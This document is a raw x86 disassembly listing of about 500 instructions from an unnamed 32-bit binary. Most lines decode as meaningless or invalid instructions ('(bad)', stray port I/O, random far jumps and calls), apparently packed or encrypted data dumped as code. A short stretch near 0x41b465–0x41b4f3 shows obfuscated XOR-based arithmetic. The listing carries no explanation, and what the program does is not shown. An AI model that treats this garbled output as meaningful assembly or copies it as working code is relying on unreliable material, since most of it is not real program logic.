  41af75:	or     DWORD PTR [ecx-0x4d],ecx
  41af78:	add    BYTE PTR [ebp-0x3e01145b],bh
  41af7e:	inc    esi
  41af7f:	jle    0x41afc8
  41af81:	pop    ds
  41af82:	mov    dl,0x99
  41af84:	pop    es
  41af85:	mov    ah,0xe8
  41af87:	popf   
  41af88:	cs push ss
  41af8a:	rol    DWORD PTR [edi],0xac
  41af8d:	nop
  41af8e:	sbb    DWORD PTR [ecx+0x217e4440],edx
  41af94:	(bad)  
  41af95:	(bad)  
  41af96:	and    BYTE PTR [ebp+0x1c],dh
  41af99:	sar    DWORD PTR [eax+0x57],cl
  41af9c:	mov    BYTE PTR [ecx-0x53af4094],dl
  41afa2:	loop   0x41afde
  41afa4:	das    
  41afa5:	and    al,al
  41afa7:	cwde   
  41afa8:	adc    BYTE PTR [esi+edi*2-0x67],bh
  41afac:	jge    0x41af3a
  41afae:	mov    DWORD PTR [edx],ecx
  41afb0:	test   BYTE PTR [edi-0x580efb69],ah
  41afb6:	push   esi
  41afb7:	add    edi,DWORD PTR [ebx+0x5e]
  41afba:	div    eax
  41afbc:	ja     0x41afb4
  41afbe:	jp     0x41af68
  41afc0:	jmp    0x41afd5
  41afc2:	sti    
  41afc3:	or     esp,ebx
  41afc5:	in     al,0xea
  41afc7:	mov    dh,0x55
  41afc9:	ret    
  41afca:	into   
  41afcb:	(bad)  
  41afcd:	dec    eax
  41afce:	adc    eax,0x33afb8f4
  41afd3:	xor    DWORD PTR [edx-0xc05465b],eax
  41afd9:	cwde   
  41afda:	mov    DWORD PTR [ecx-0x3f0598fa],edx
  41afe0:	stos   DWORD PTR es:[edi],eax
  41afe1:	fs cmc 
  41afe3:	jne    0x41af97
  41afe5:	mov    ds:0xd77bd1fd,eax
  41afea:	inc    ecx
  41afeb:	mov    bl,0x8f
  41afed:	inc    ebp
  41afee:	jnp    0x41b06b
  41aff0:	push   0x7b
  41aff2:	repnz imul ebx,DWORD PTR [ebp-0x4b],0x47b4d868
  41affa:	out    dx,al
  41affb:	jbe    0x41b039
  41affd:	loope  0x41b06a
  41afff:	cmp    eax,DWORD PTR [eax]
  41b001:	cli    
  41b002:	lahf   
  41b003:	ficomp DWORD PTR [edi+0xa4d9b34]
  41b009:	in     al,dx
  41b00a:	mov    esp,0x8aeb29ca
  41b00f:	pop    ebp
  41b010:	test   DWORD PTR [eax+0x47a9e240],ebp
  41b016:	push   ds
  41b017:	jbe    0x41b00c
  41b019:	fsub   DWORD PTR [edx]
  41b01b:	(bad)  
  41b01c:	pop    edi
  41b01d:	mov    eax,ds:0xaeece3d8
  41b022:	mov    DWORD PTR [edx],edx
  41b024:	fcom   QWORD PTR [ebx+0x7af9d2b]
  41b02a:	ins    BYTE PTR es:[edi],dx
  41b02b:	cmp    eax,0x112ae348
  41b030:	jg     0x41b09c
  41b032:	rol    BYTE PTR [eax],cl
  41b034:	sub    BYTE PTR [eax-0x38],bl
  41b037:	and    eax,eax
  41b039:	mov    esi,0x9e52678e
  41b03e:	(bad)  
  41b03f:	mov    ecx,0x8d78fd7e
  41b044:	sbb    al,0xec
  41b046:	in     al,0x6
  41b048:	or     DWORD PTR [edx+0x9],edi
  41b04b:	jb     0x41b01b
  41b04d:	adc    BYTE PTR [edx],0x6
  41b050:	fcom   DWORD PTR [ebp-0x61]
  41b053:	adc    al,0x5b
  41b055:	jmp    0x41b095
  41b057:	push   ecx
  41b058:	jo     0x41b020
  41b05a:	std    
  41b05b:	adc    al,0xa0
  41b05d:	jg     0x41b0a7
  41b05f:	jae    0x41b00d
  41b061:	jns    0x41b086
  41b063:	call   0x78a7369a
  41b068:	loope  0x41b097
  41b06a:	ror    DWORD PTR [edi],0x19
  41b06d:	loope  0x41b07b
  41b06f:	aaa    
  41b070:	mov    ds:0xa4e75fa1,eax
  41b075:	test   eax,0x6a8ec9ba
  41b07a:	pop    ds
  41b07b:	pop    edi
  41b07c:	cs out dx,al
  41b07e:	sub    eax,0x905e911c
  41b083:	es mov ah,0xf6
  41b086:	pop    ds
  41b087:	jl     0x41b05b
  41b089:	sub    BYTE PTR [eax],al
  41b08b:	jmp    0x41b0fc
  41b08d:	neg    BYTE PTR [edi-0x6516bd44]
  41b093:	xchg   edx,eax
  41b094:	and    BYTE PTR [edx-0x5d],ah
  41b097:	lods   al,BYTE PTR ds:[esi]
  41b098:	stos   BYTE PTR es:[edi],al
  41b099:	jae    0x41b0e5
  41b09b:	lods   eax,DWORD PTR ds:[esi]
  41b09c:	xor    BYTE PTR [ebx-0x22],ch
  41b09f:	mov    dh,0xe2
  41b0a1:	adc    al,0x82
  41b0a3:	ins    DWORD PTR es:[edi],dx
  41b0a4:	jo     0x41b0a5
  41b0a6:	jmp    0x6f86a838
  41b0ab:	mov    eax,0x38ea7da3
  41b0b0:	xchg   DWORD PTR [ebp+0x79],ecx
  41b0b3:	cmp    BYTE PTR [ebx-0x6c],ah
  41b0b6:	mov    al,ds:0xd15ede60
  41b0bb:	dec    edx
  41b0bc:	scas   eax,DWORD PTR es:[edi]
  41b0bd:	xchg   ebx,eax
  41b0be:	dec    ebp
  41b0bf:	xor    DWORD PTR [ebp-0x30],esi
  41b0c2:	mov    dh,0x7b
  41b0c4:	loop   0x41b12e
  41b0c6:	neg    DWORD PTR ds:0xe2ea02be
  41b0cc:	enter  0x6291,0x2a
  41b0d0:	xor    cl,BYTE PTR [ebx-0x1e]
  41b0d3:	push   eax
  41b0d4:	mov    esi,ds
  41b0d6:	cmp    dl,cl
  41b0d8:	add    edi,ecx
  41b0da:	adc    bl,BYTE PTR [ebx+eiz*8]
  41b0dd:	mov    eax,ebp
  41b0df:	sbb    eax,0x163c4696
  41b0e4:	loope  0x41b144
  41b0e6:	arpl   bx,si
  41b0e8:	xchg   DWORD PTR [edx],edi
  41b0ea:	mov    bl,0xc7
  41b0ec:	pop    es
  41b0ed:	mov    dl,0xb1
  41b0ef:	std    
  41b0f0:	xchg   esp,eax
  41b0f1:	push   cs
  41b0f2:	jnp    0x41b166
  41b0f4:	xchg   ebx,eax
  41b0f5:	mov    dl,0xdb
  41b0f7:	or     eax,0x4e84f78
  41b0fc:	jbe    0x41b146
  41b0fe:	xchg   edx,eax
  41b0ff:	cmp    esp,DWORD PTR [ecx+0x2292cef5]
  41b105:	out    dx,eax
  41b106:	xor    eax,0xbfc34f51
  41b10b:	add    al,0x47
  41b10d:	and    DWORD PTR [eax-0x5e],0x76
  41b111:	and    al,BYTE PTR [edx+0x792732ac]
  41b117:	jo     0x41b122
  41b119:	dec    ebp
  41b11a:	mov    bl,0x71
  41b11c:	mov    dl,0xa6
  41b11e:	rcl    esi,1
  41b120:	fcom   DWORD PTR [ecx]
  41b122:	and    DWORD PTR [ebx-0x7fb286e1],ebp
  41b128:	out    0xaf,eax
  41b12a:	iret   
  41b12b:	and    ecx,DWORD PTR [ebx+0x6b]
  41b12e:	cmp    BYTE PTR [ebx-0x61],ch
  41b131:	mov    ebx,DWORD PTR [edi+0x7517861a]
  41b137:	adc    eax,0x856afac7
  41b13c:	pop    ds
  41b13d:	ror    BYTE PTR [edx],0x20
  41b140:	ret    0xfe03
  41b143:	mov    cl,0xac
  41b145:	xlat   BYTE PTR ds:[ebx]
  41b146:	lds    esp,FWORD PTR [eax+eiz*1-0x3031657c]
  41b14d:	sbb    eax,0xb7d00dd7
  41b152:	jmp    0xbe22279d
  41b157:	add    al,0x90
  41b159:	imul   edi,eax,0xfffffffe
  41b15c:	xchg   esi,eax
  41b15d:	xor    edx,DWORD PTR [esi-0x648eeda4]
  41b163:	pop    esi
  41b164:	dec    edi
  41b165:	mov    DWORD PTR [ebp-0x330440fd],edx
  41b16b:	cmc    
  41b16c:	mov    al,ds:0x2320469
  41b171:	mov    edi,0x382f0806
  41b176:	jne    0x41b120
  41b178:	pusha  
  41b179:	lods   al,BYTE PTR ds:[esi]
  41b17a:	mov    edx,cs
  41b17c:	and    al,0x19
  41b17e:	lock sub cl,BYTE PTR [edi+0x49e49dac]
  41b185:	jge    0x41b152
  41b187:	cmp    eax,DWORD PTR [eax]
  41b189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b18b:	mov    esi,0x6650d68a
  41b190:	(bad)  
  41b191:	int3   
  41b192:	into   
  41b193:	inc    edi
  41b194:	push   ecx
  41b195:	push   edx
  41b196:	pop    edx
  41b197:	ficom  WORD PTR [esi]
  41b199:	push   ebp
  41b19a:	sbb    ecx,DWORD PTR [edi-0x5b]
  41b19d:	(bad)  
  41b19e:	in     al,dx
  41b19f:	xchg   BYTE PTR [ecx+ecx*4],dl
  41b1a2:	ja     0x41b1de
  41b1a4:	(bad)  
  41b1a5:	xor    bh,BYTE PTR [edi]
  41b1a7:	in     eax,dx
  41b1a8:	loop   0x41b1e2
  41b1aa:	outs   dx,DWORD PTR ds:[esi]
  41b1ab:	xchg   ecx,eax
  41b1ac:	add    al,0x21
  41b1ae:	inc    ebp
  41b1af:	mov    bh,BYTE PTR [ebx-0x414d24f5]
  41b1b5:	mov    bl,0x13
  41b1b7:	jmp    0x41b163
  41b1b9:	(bad)  
  41b1ba:	pop    ebp
  41b1bb:	cmp    eax,0x70a31b6a
  41b1c0:	repnz sub cl,BYTE PTR [edi+0x53]
  41b1c4:	dec    esp
  41b1c5:	mov    dl,0xd4
  41b1c7:	and    ecx,ebx
  41b1c9:	outs   dx,BYTE PTR ds:[esi]
  41b1ca:	les    eax,FWORD PTR [eax-0x6bfa3014]
  41b1d0:	adc    eax,0x8a776a4a
  41b1d5:	mov    edi,0x938c7dbf
  41b1da:	mov    edi,0x7cbb8225
  41b1df:	adc    DWORD PTR [ecx+0x60852cc9],ecx
  41b1e5:	inc    eax
  41b1e6:	mov    edx,0x9fd8cb4a
  41b1eb:	cmp    bh,dh
  41b1ed:	push   ss
  41b1ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ef:	xor    DWORD PTR [ebp+esi*8+0xf],esp
  41b1f3:	fwait
  41b1f4:	mov    ecx,0xd6d8c921
  41b1f9:	mov    eax,ds:0x1ccdc518
  41b1fe:	lahf   
  41b1ff:	and    BYTE PTR ds:[edi-0xbb6743b],bl
  41b206:	lock mov bl,ah
  41b209:	push   es
  41b20a:	push   ss
  41b20b:	test   BYTE PTR [eax-0x247b5390],ch
  41b211:	push   ebx
  41b212:	mov    eax,DWORD PTR ds:0x3ea25b4a
  41b218:	inc    edx
  41b219:	sbb    eax,0x9dcf060c
  41b21e:	nop
  41b21f:	(bad)  
  41b221:	mov    ah,0x28
  41b223:	stos   BYTE PTR es:[edi],al
  41b224:	repnz cmc 
  41b226:	xor    BYTE PTR [eax],al
  41b228:	shr    DWORD PTR [eax+0x7cb66fca],cl
  41b22e:	xchg   edi,eax
  41b22f:	test   DWORD PTR [ebp-0x2be00218],0xebf61ca0
  41b239:	ins    DWORD PTR es:[edi],dx
  41b23a:	call   0x3fc1:0x29c4e8bf
  41b241:	inc    eax
  41b242:	shr    edx,0x74
  41b245:	xor    eax,0xff7f73d
  41b24a:	fld    TBYTE PTR [ebp-0x6b]
  41b24d:	or     esp,DWORD PTR [ebp-0x45ac03f4]
  41b253:	push   edx
  41b254:	data16 cmp dl,cl
  41b257:	cmp    al,0xca
  41b259:	jno    0x41b21e
  41b25b:	sub    eax,DWORD PTR [ebx-0x27]
  41b25e:	cdq    
  41b25f:	sbb    BYTE PTR [edx-0x5d5dcbf3],ch
  41b265:	mov    ds:0x4bb19bf6,eax
  41b26a:	jge    0x41b267
  41b26c:	adc    al,cl
  41b26e:	dec    esi
  41b26f:	shl    DWORD PTR [esi-0x11b5d102],0x60
  41b276:	hlt    
  41b277:	iret   
  41b278:	jno    0x41b1fb
  41b27a:	in     al,dx
  41b27b:	push   0x5aee654e
  41b280:	push   ecx
  41b281:	sub    esp,ebx
  41b283:	xchg   ebp,eax
  41b284:	stos   DWORD PTR es:[edi],eax
  41b285:	inc    ebx
  41b286:	cdq    
  41b287:	pop    esi
  41b288:	dec    DWORD PTR [edi+edx*4]
  41b28b:	cmp    ch,BYTE PTR [ecx-0x54]
  41b28e:	jne    0x41b24c
  41b290:	mov    dl,0xa8
  41b292:	fsubrp st(0),st
  41b294:	jno    0x41b248
  41b296:	and    BYTE PTR [ebx-0x3fa3ddba],al
  41b29c:	push   ds
  41b29d:	call   0xd52833f
  41b2a2:	push   edi
  41b2a3:	js     0x41b2c9
  41b2a5:	jl     0x41b2f8
  41b2a7:	mov    al,0x8b
  41b2a9:	in     eax,0x6f
  41b2ab:	cmp    bl,dh
  41b2ad:	lea    ebp,[esp+edx*1-0x69]
  41b2b1:	or     eax,0xb1fd943b
  41b2b6:	lods   eax,DWORD PTR ds:[esi]
  41b2b7:	das    
  41b2b8:	jp     0x41b31d
  41b2ba:	outs   dx,DWORD PTR ds:[esi]
  41b2bb:	repz pop ds
  41b2bd:	mov    bl,dl
  41b2bf:	inc    ebx
  41b2c0:	pop    ss
  41b2c1:	mov    edx,0xd9c0dc58
  41b2c6:	fld    DWORD PTR [ecx]
  41b2c8:	xor    bl,bl
  41b2ca:	inc    edx
  41b2cb:	leave  
  41b2cc:	lds    ebx,FWORD PTR ds:0x5efc898
  41b2d2:	mov    eax,DWORD PTR [ebp+0x78]
  41b2d5:	lahf   
  41b2d6:	mov    dh,0x26
  41b2d8:	ins    BYTE PTR es:[edi],dx
  41b2d9:	loopne 0x41b2e5
  41b2db:	in     eax,0x7a
  41b2dd:	popf   
  41b2de:	pop    ds
  41b2df:	push   edi
  41b2e0:	push   0xf11f2cea
  41b2e5:	ins    DWORD PTR es:[edi],dx
  41b2e6:	mov    ecx,0x905f131a
  41b2eb:	shl    DWORD PTR [eax],1
  41b2ed:	iret   
  41b2ee:	or     dl,BYTE PTR [ebp+0x4a26055c]
  41b2f4:	outs   dx,BYTE PTR ds:[esi]
  41b2f5:	daa    
  41b2f6:	dec    ebx
  41b2f8:	xor    DWORD PTR [edi+0x425637ce],ebx
  41b2fe:	and    dl,ah
  41b300:	inc    ebx
  41b301:	cld    
  41b302:	add    esi,ecx
  41b304:	retf   0xb934
  41b307:	cmp    ah,al
  41b309:	fdiv   DWORD PTR [edx-0x7b447232]
  41b30f:	test   dh,bh
  41b311:	sti    
  41b312:	mov    esp,0x8e60da5b
  41b317:	pop    ebx
  41b318:	push   ds
  41b319:	jns    0x41b2b9
  41b31b:	ror    dl,0xdf
  41b31e:	adc    BYTE PTR [edx+0x25aeed1e],cl
  41b324:	cli    
  41b325:	add    al,0xbb
  41b327:	push   0x74658c9e
  41b32c:	or     edx,DWORD PTR [edx]
  41b32e:	mov    eax,ds:0x50dde29c
  41b333:	jle    0x41b312
  41b335:	dec    edx
  41b336:	mov    ecx,0xf9e78193
  41b33b:	das    
  41b33c:	push   edx
  41b33d:	or     ebp,DWORD PTR [ecx+0x3b]
  41b340:	adc    bl,BYTE PTR [ecx+0x18]
  41b343:	jp     0x41b3c1
  41b345:	int3   
  41b346:	jae    0x41b324
  41b348:	fild   DWORD PTR [edi+0x66c88cc9]
  41b34e:	sbb    cl,ah
  41b350:	cmp    al,0xa8
  41b352:	jmp    0x41b2fc
  41b354:	fwait
  41b355:	sar    BYTE PTR [edi+0x5e],1
  41b358:	aas    
  41b359:	inc    esi
  41b35a:	xchg   ecx,eax
  41b35b:	pop    ebp
  41b35c:	and    ebx,DWORD PTR [eax-0x785ff446]
  41b362:	popf   
  41b363:	addr16 dec edx
  41b365:	push   ebp
  41b366:	lods   al,BYTE PTR ds:[esi]
  41b367:	stos   BYTE PTR es:[edi],al
  41b368:	in     al,0xd0
  41b36a:	pop    ebx
  41b36b:	retf   
  41b36c:	inc    esi
  41b36d:	mov    DWORD PTR [ebx+0x80d2a8d],ebp
  41b373:	mov    edx,0xa5a6ee28
  41b378:	in     al,0xdc
  41b37a:	mov    ch,0xa9
  41b37c:	cmp    DWORD PTR [ebp+0x3c95e82d],edi
  41b382:	scas   al,BYTE PTR es:[edi]
  41b383:	xchg   ebx,eax
  41b384:	mov    esi,0x815b8e14
  41b389:	jl     0x41b3c6
  41b38b:	lds    eax,FWORD PTR [esi-0x636af034]
  41b391:	push   DWORD PTR [esi-0x391885cf]
  41b397:	push   ebx
  41b398:	stc    
  41b399:	lock pushf 
  41b39b:	sti    
  41b39c:	mov    eax,0xcff8c9a8
  41b3a1:	xlat   BYTE PTR ds:[ebx]
  41b3a2:	mov    dl,0xdd
  41b3a4:	xor    BYTE PTR [ecx+0x1b],ah
  41b3a7:	daa    
  41b3a8:	jge    0x41b3fb
  41b3aa:	shr    DWORD PTR [edi+0x58],cl
  41b3ad:	aaa    
  41b3ae:	(bad)  
  41b3af:	cmp    BYTE PTR [ecx-0x56],dh
  41b3b2:	mov    edi,ebx
  41b3b4:	adc    al,0x22
  41b3b6:	in     al,dx
  41b3b7:	scas   eax,DWORD PTR es:[edi]
  41b3b8:	fdiv   DWORD PTR [ecx-0x25]
  41b3bb:	jecxz  0x41b377
  41b3bd:	icebp  
  41b3be:	mov    dl,0x37
  41b3c0:	dec    edx
  41b3c1:	test   eax,0x2fca52cc
  41b3c6:	pop    ecx
  41b3c7:	sbb    DWORD PTR [edx+0x53],ecx
  41b3ca:	test   BYTE PTR fs:[edx-0x2459372e],ch
  41b3d1:	fisub  DWORD PTR [edx]
  41b3d3:	dec    ecx
  41b3d4:	mov    dh,0xaf
  41b3d6:	rcr    BYTE PTR [ebx],0x12
  41b3d9:	mov    ch,ah
  41b3db:	test   DWORD PTR [ebx-0x48],edi
  41b3de:	add    al,0xfb
  41b3e0:	ficomp WORD PTR [ebx+0x75df9072]
  41b3e6:	sub    dh,BYTE PTR [ebp+0x5a0009ed]
  41b3ec:	push   ds
  41b3ed:	ins    BYTE PTR es:[edi],dx
  41b3ee:	inc    eax
  41b3ef:	sbb    ch,bl
  41b3f1:	aam    0x6c
  41b3f3:	mov    cl,0x76
  41b3f5:	jns    0x41b3cb
  41b3f7:	int    0x1c
  41b3f9:	repnz enter 0xeb1c,0x39
  41b3fe:	dec    edx
  41b3ff:	or     eax,0x739ab18e
  41b404:	out    0x97,al
  41b406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b407:	mov    ebx,0x57e28eb6
  41b40c:	data16 add al,0x18
  41b40f:	xchg   ebx,eax
  41b410:	test   cl,bl
  41b412:	push   es
  41b413:	sbb    eax,0x4634b9a4
  41b418:	(bad)  
  41b419:	pop    esi
  41b41a:	es aam 0x8e
  41b41d:	imul   edx,DWORD PTR [ebx],0xffffffda
  41b420:	cdq    
  41b421:	sub    esp,DWORD PTR [ebp+ebx*1-0x55f51dca]
  41b428:	pop    ecx
  41b429:	es ret 0x69ad
  41b42d:	push   edx
  41b42e:	mov    edi,0x770e8f4f
  41b433:	inc    esp
  41b434:	cmc    
  41b435:	ret    
  41b436:	pop    edx
  41b437:	mov    ebx,0x8b08558b
  41b43c:	pop    ebp
  41b43d:	test   al,0x81
  41b43f:	ret    0x8fa
  41b442:	push   edi
  41b443:	add    BYTE PTR [edi],cl
  41b445:	scas   eax,DWORD PTR es:[edi]
  41b446:	ror    DWORD PTR [ecx+0x558ba855],cl
  41b44c:	or     BYTE PTR [ebx-0x3d7e53a3],cl
  41b452:	cwde   
  41b453:	clc    
  41b454:	add    BYTE PTR fs:[ebx],cl
  41b457:	ror    DWORD PTR [ecx+0x558bac55],cl
  41b45d:	or     BYTE PTR [ebx-0x2efc4fa3],cl
  41b463:	xor    edx,ebx
  41b465:	mov    DWORD PTR [ebp-0x50],edx
  41b468:	mov    edx,DWORD PTR [ebp+0x8]
  41b46b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b46e:	add    edx,edi
  41b470:	and    edx,ebx
  41b472:	mov    DWORD PTR [ebp-0x4c],edx
  41b475:	mov    edx,DWORD PTR [ebp+0x8]
  41b478:	mov    ebx,DWORD PTR [ebp-0x48]
  41b47b:	lea    edx,[ebx+edx*1+0x241fcdf]
  41b482:	mov    DWORD PTR [ebp-0x48],edx
  41b485:	mov    edx,DWORD PTR [ebp+0x8]
  41b488:	mov    ebx,0xfa5e1524
  41b48d:	sub    ebx,edx
  41b48f:	add    ebx,DWORD PTR [ebp-0x44]
  41b492:	mov    DWORD PTR [ebp-0x44],ebx
  41b495:	mov    edx,DWORD PTR [ebp+0x8]
  41b498:	xor    edx,eax
  41b49a:	add    edx,esi
  41b49c:	jne    0x4190c6
  41b4a2:	mov    edx,DWORD PTR [ebp-0x8]
  41b4a5:	mov    ebx,DWORD PTR [ebp-0xc]
  41b4a8:	xor    edx,eax
  41b4aa:	lea    edx,[edx+ebx*1+0x3272f1]
  41b4b1:	mov    DWORD PTR [ebp-0xc],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x10]
  41b4b7:	xor    edx,eax
  41b4b9:	add    edx,esi
  41b4bb:	jne    0x41465c
  41b4c1:	jmp    0x421ff5
  41b4c6:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4c9:	mov    DWORD PTR [ebp+0x8],ecx
  41b4cc:	jmp    0x41fc03
  41b4d1:	mov    ecx,DWORD PTR [ebp+0x8]
  41b4d4:	mov    edx,DWORD PTR [ebp-0x8]
  41b4d7:	xor    ecx,eax
  41b4d9:	xor    edx,eax
  41b4db:	sub    ecx,edx
  41b4dd:	sub    ecx,esi
  41b4df:	xor    ecx,eax
  41b4e1:	mov    DWORD PTR [ebp+0x8],ecx
  41b4e4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b4e7:	mov    edx,DWORD PTR [ebp-0x58]
  41b4ea:	add    ecx,0x5708fa
  41b4f0:	imul   ecx,edx
  41b4f3:	jmp    0x41d852
  41b4f8:	test   al,0x3a
  41b4fa:	jl     0x41b49e
  41b4fc:	out    dx,al
  41b4fd:	mov    ds:0xdb3d32a2,al
  41b502:	sti    
  41b503:	loopne 0x41b4c8
  41b505:	push   es
  41b506:	inc    edi
  41b507:	inc    ecx
  41b508:	in     eax,dx
  41b509:	clc    
  41b50a:	jl     0x41b48f
  41b50c:	cmp    eax,0x3283835e
  41b511:	jo     0x41b4b0
  41b513:	push   edi
  41b514:	inc    esi
  41b515:	pop    ebx
  41b516:	or     al,0x25
  41b518:	js     0x41b56c
  41b51a:	je     0x41b560
  41b51c:	jae    0x41b4a4
  41b51e:	dec    BYTE PTR [ebx+ebx*2]
  41b521:	(bad)  
  41b522:	lods   al,BYTE PTR ds:[esi]
  41b523:	mov    ch,0x57
  41b525:	ficom  WORD PTR [esi+edi*2-0x46]
  41b529:	or     eax,0x71e6bf65
  41b52e:	leave  
  41b52f:	sub    esi,DWORD PTR [esi]
  41b531:	cmc    
  41b532:	jmp    0xbf3e:0x932cb605
  41b539:	fbld   TBYTE PTR [edi-0x7c]
  41b53c:	xchg   DWORD PTR [ecx],ebp
  41b53e:	test   DWORD PTR [ebx-0x44],ecx
  41b541:	fwait
  41b542:	xrelease xchg BYTE PTR [ebx],bh
  41b545:	or     cl,bl
  41b547:	inc    ebx
  41b548:	push   es
  41b549:	push   0xffffffce
  41b54b:	mov    cl,0xb7
  41b54d:	sbb    DWORD PTR [ebx],0xffffffea
  41b550:	xchg   esi,eax
  41b551:	and    al,cl
  41b553:	jmp    0x1125beeb
  41b558:	(bad)  
  41b559:	push   eax
  41b55a:	ds ret 
  41b55c:	sbb    al,0x58
  41b55e:	addr16 cli 
  41b560:	inc    eax
  41b561:	push   es
  41b562:	shr    BYTE PTR [edi+0x50],0x78
  41b566:	fwait
  41b567:	sub    BYTE PTR [eax+0x32],bh
  41b56a:	jge    0x41b5e7
  41b56c:	out    0xdd,al
  41b56e:	in     eax,0x19
  41b570:	test   BYTE PTR [ecx],dh
  41b572:	call   0x26c739e5
  41b577:	xor    bl,bl
  41b579:	fnstsw WORD PTR [edi]
  41b57b:	and    BYTE PTR [edi+0xb6244f0],bl
  41b581:	dec    ebx
  41b582:	cmp    eax,0x1143e866
  41b587:	xor    BYTE PTR [ebx-0x6d],dl
  41b58a:	iret   
  41b58b:	mov    bl,0x95
  41b58d:	addr16 retf 
  41b58f:	mov    ds:0xa17f81c4,eax
  41b594:	jmp    0x41b559
  41b596:	fwait
  41b597:	push   ebx
  41b598:	bound  edi,QWORD PTR [edi+edi*4]
  41b59b:	cmp    al,0x2b
  41b59d:	xor    eax,esi
  41b59f:	mov    BYTE PTR [ebp-0x160f7b27],dh
  41b5a5:	pushf  
  41b5a6:	repz test eax,0x1e5c3d4a
  41b5ac:	mov    eax,ds:0x7d5f43e9
  41b5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5b2:	mov    cl,0xe3
  41b5b4:	push   esp
  41b5b5:	inc    esi
  41b5b6:	imul   eax,DWORD PTR [ebx],0xffffffc4
  41b5b9:	xor    BYTE PTR [esi-0x25a9727d],0x76
  41b5c0:	dec    ecx
  41b5c1:	push   ss
  41b5c2:	adc    eax,0xdf98f242
  41b5c7:	sbb    eax,0xa85fdaea
  41b5cc:	mov    BYTE PTR [ebp-0x2e569652],0x5a
  41b5d3:	lods   eax,DWORD PTR ds:[esi]
  41b5d4:	inc    ecx
  41b5d5:	cmp    eax,0xd686f68d
  41b5da:	jecxz  0x41b5e2
  41b5dc:	xor    eax,0xc037bb9e
  41b5e1:	xchg   ebx,eax
  41b5e2:	adc    eax,0x5c1c9911
  41b5e7:	mov    ds:0xbe97ab69,eax
  41b5ec:	arpl   WORD PTR [ecx],ax
  41b5ee:	nop
  41b5ef:	lock cwde 
  41b5f1:	enter  0x71a2,0x80
  41b5f5:	int3   
  41b5f6:	adc    eax,0x7f010f40
  41b5fb:	xchg   esp,eax
  41b5fc:	ror    BYTE PTR [eax+0x35],0x57
  41b600:	dec    esi
  41b601:	in     eax,0xca
  41b603:	adc    eax,0xb86751a4
  41b608:	call   0xbefd92df
  41b60d:	stos   BYTE PTR es:[edi],al
  41b60e:	je     0x41b5ab
  41b610:	retf   
  41b611:	arpl   cx,cx
  41b613:	fldcw  WORD PTR [esi-0x6400ffed]
  41b619:	aad    0x8d
  41b61b:	stos   BYTE PTR es:[edi],al
  41b61c:	xor    bl,ch
  41b61e:	cmp    edi,DWORD PTR [esi]
  41b620:	xchg   esp,eax
  41b621:	and    ch,al
  41b623:	adc    edi,DWORD PTR [ecx-0x31]
  41b626:	push   ebp
  41b627:	dec    esp
  41b628:	mov    fs,esi
  41b62a:	xor    edi,edx
  41b62c:	sub    BYTE PTR ss:[ebx+ecx*1+0x7727958a],ah
  41b634:	push   0xfffffff9
  41b636:	xor    dh,BYTE PTR [ecx+0x3962b8fe]
  41b63c:	xchg   esi,eax
  41b63d:	cmc    
  41b63e:	sub    eax,0x532c785a
  41b643:	ds aas 
  41b645:	arpl   WORD PTR [edx],sp
  41b647:	and    eax,0xb0efdaeb
  41b64c:	lds    ebp,FWORD PTR [edi+0x3d]
  41b64f:	pop    eax
  41b650:	outs   dx,DWORD PTR ds:[esi]
  41b651:	sub    eax,0x49d81b3f
  41b656:	ins    DWORD PTR es:[edi],dx
  41b657:	inc    edi
  41b658:	fimul  DWORD PTR [ebx+eiz*2]
  41b65b:	ins    BYTE PTR es:[edi],dx
  41b65c:	mov    eax,ds:0x194aaca9
  41b661:	addr16 inc eax
  41b663:	pop    ss
  41b664:	stos   DWORD PTR es:[edi],eax
  41b665:	adc    BYTE PTR [ebx],bh
  41b667:	cli    
  41b668:	sub    DWORD PTR [ebx],edx
  41b66a:	sbb    al,0xc5
  41b66c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b66d:	test   BYTE PTR [ecx+esi*2-0x37],0xae
  41b672:	cmp    al,0x93
  41b674:	xchg   esp,eax
  41b675:	push   ss
  41b676:	push   ebp
  41b677:	and    BYTE PTR [ebx-0x6d],dl
  41b67a:	xchg   esi,eax
  41b67b:	popa   
  41b67c:	jge    0x41b6f7
  41b67e:	fcmovnu st,st(3)
  41b680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b681:	adc    BYTE PTR [edx],bl
  41b683:	or     eax,0x226ac7e8
  41b688:	js     0x41b702
  41b68a:	ins    DWORD PTR es:[edi],dx
  41b68b:	bound  esp,QWORD PTR [ecx]
  41b68d:	inc    edi
  41b68e:	jne    0x41b6b7
  41b690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b691:	adc    al,0x50
  41b693:	hlt    
  41b694:	or     bl,BYTE PTR [ebx+edi*1]
  41b697:	adc    ebx,DWORD PTR [ebp+0x666d85fa]
  41b69d:	stc    
  41b69e:	(bad)  
  41b69f:	pusha  
  41b6a0:	sub    DWORD PTR [eax],esi
  41b6a2:	hlt    
  41b6a3:	dec    edi
  41b6a4:	mov    cs,WORD PTR [esi+0x7b]
  41b6a7:	sbb    al,0xb0
  41b6a9:	xchg   edi,eax
  41b6aa:	stos   BYTE PTR es:[edi],al
  41b6ab:	cmp    BYTE PTR ds:0x6d91ef78,al
  41b6b1:	dec    esi
  41b6b2:	xchg   esp,eax
  41b6b3:	xchg   edi,ebp
  41b6b5:	test   DWORD PTR [edx+ebx*4],ebx
  41b6b8:	push   cs
  41b6b9:	sub    al,0x25
  41b6bb:	xor    dh,dl
  41b6bd:	test   BYTE PTR [ecx+0x2e],dl
  41b6c0:	sbb    dh,BYTE PTR [edi+0x46]
  41b6c3:	fisub  WORD PTR [ebx+eiz*4+0x9]
  41b6c7:	ja     0x41b740
  41b6c9:	mov    edx,0x73c6d1fa
  41b6ce:	cmp    al,0x90
  41b6d0:	cmc    
  41b6d1:	pop    esp
  41b6d2:	dec    edi
  41b6d3:	push   edx
  41b6d4:	jecxz  0x41b6a1
  41b6d6:	fwait
  41b6d7:	call   0x1787fba7
  41b6dc:	and    DWORD PTR [eax+0x1e21c2d5],esi
  41b6e2:	icebp  
